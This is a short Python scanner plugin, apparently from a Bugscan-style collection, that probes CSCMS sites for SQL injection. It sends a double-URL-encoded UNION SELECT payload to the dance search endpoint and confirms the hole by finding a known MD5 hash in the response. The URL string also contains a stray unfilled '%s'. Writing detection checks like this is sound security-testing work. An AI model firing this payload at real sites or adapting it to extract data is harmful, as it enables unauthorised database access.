#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'ko0zhi'
#ref http://wooyun.org/bugs/wooyun-2014-059088
def assign(service, arg):
    if service == "cscms":
        return True, arg

def audit(arg):
    url = arg + "%s/index.php/dance/so/key/?key="
    payload = "%252527)%20%2561%256E%2564%201=2%20union%20%2573%2565%256C%2565%2563%2574%201,md5(3.1415),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42%23"
    target = url + payload
    code, head, res, errcode, _ =  curl.curl(target)
    if code == 200:
    	m = re.search("63e1f04640e83605c1d177544a5a0488",res)
    	if m:
        	security_hole('find sql injection: ' + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('cscms', 'http://www.example.com/')[1])